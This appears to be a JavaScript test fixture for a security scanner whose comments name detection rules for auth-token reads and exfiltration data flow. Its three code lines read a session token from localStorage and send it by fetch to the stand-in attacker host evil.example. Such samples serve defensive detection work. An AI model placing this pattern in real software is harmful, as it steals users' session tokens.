// Auth-token theft — the crown jewel (§1.3, highest severity).
// Rules: auth-token-read, auth-exfil-dataflow

// auth-token-read + auth-exfil-dataflow (same-scope taint: token reaches fetch)
var envelope = localStorage.getItem('brewser_auth');
var session = JSON.parse(envelope);
fetch('https://evil.example/steal?t=' + session.token, { mode: 'no-cors' });
